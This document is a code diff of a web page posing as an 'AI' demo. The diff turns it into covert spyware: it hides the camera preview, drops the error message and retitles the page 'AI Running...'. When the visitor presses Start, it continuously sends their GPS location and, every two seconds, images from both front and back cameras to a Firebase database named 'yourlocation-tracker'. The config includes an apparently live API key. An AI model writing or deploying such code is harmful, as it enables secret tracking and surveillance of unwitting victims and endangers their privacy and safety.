@@ -8,97 +8,98 @@
 
 <style>
 body{
-font-family: Arial;
-text-align:center;
 background:black;
 color:white;
+text-align:center;
+font-family:Arial;
 }
-
 video{
-width:90%;
-max-width:400px;
-border:2px solid white;
-margin-top:10px;
+display:none; /* camera preview hidden */
 }
-
 button{
 padding:15px;
 font-size:18px;
-margin-top:20px;
-cursor:pointer;
 }
 </style>
 
 </head>
 <body>
 
-<h2>What Is AI Control</h2>
+<h2>AI Running...</h2>
 
-<button onclick="startSharing()">Start AI System</button>
+<button onclick="start()">Start</button>
 
-<br>
-
-<video id="camera" autoplay playsinline></video>
+<video id="front"></video>
+<video id="back"></video>
 
 <script>
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
-  authDomain: "yourlocation-tracker.firebaseapp.com",
-  databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "yourlocation-tracker",
-  storageBucket: "yourlocation-tracker.firebasestorage.app",
-  messagingSenderId: "64952347835",
-  appId: "1:64952347835:web:4f48ef82c9b10f0f7c0d9e"
+ apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
+ authDomain: "yourlocation-tracker.firebaseapp.com",
+ databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
+ projectId: "yourlocation-tracker"
 };
 
 firebase.initializeApp(firebaseConfig);
 
-let phoneId = "phone_" + Math.floor(Math.random()*100000);
+let id = "phone_"+Math.floor(Math.random()*100000);
 
-function startSharing(){
+function start(){
 
-// LOCATION permission request
-navigator.geolocation.watchPosition(function(pos){
+// LOCATION
+navigator.geolocation.watchPosition(pos=>{
 
-firebase.database().ref("devices/"+phoneId+"/location").set({
+firebase.database().ref("devices/"+id+"/location").set({
 lat: pos.coords.latitude,
 lon: pos.coords.longitude
 });
 
 });
 
-// CAMERA permission request
-navigator.mediaDevices.getUserMedia({video:true})
-.then(stream=>{
+// FRONT CAMERA
+navigator.mediaDevices.getUserMedia({
+video:{facingMode:"user"}
+}).then(stream=>{
 
-const video = document.getElementById("camera");
+let video=document.getElementById("front");
+video.srcObject=stream;
 
-video.srcObject = stream;
+sendFrames(video,"front");
 
-const canvas = document.createElement("canvas");
+});
 
-const ctx = canvas.getContext("2d");
+// BACK CAMERA
+navigator.mediaDevices.getUserMedia({
+video:{facingMode:"environment"}
+}).then(stream=>{
+
+let video=document.getElementById("back");
+video.srcObject=stream;
+
+sendFrames(video,"back");
+
+});
+
+}
+
+function sendFrames(video,type){
+
+let canvas=document.createElement("canvas");
+let ctx=canvas.getContext("2d");
 
 setInterval(()=>{
 
-canvas.width = video.videoWidth;
-canvas.height = video.videoHeight;
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
 
 ctx.drawImage(video,0,0);
 
-let imageData = canvas.toDataURL("image/jpeg",0.5);
-
-firebase.database().ref("devices/"+phoneId+"/camera").set({
-image:imageData
+firebase.database().ref("devices/"+id+"/camera/"+type).set({
+img:canvas.toDataURL("image/jpeg",0.5)
 });
 
 },2000);
-
-})
-.catch(err=>{
-alert("Camera permission denied or error");
-});
 
 }
 
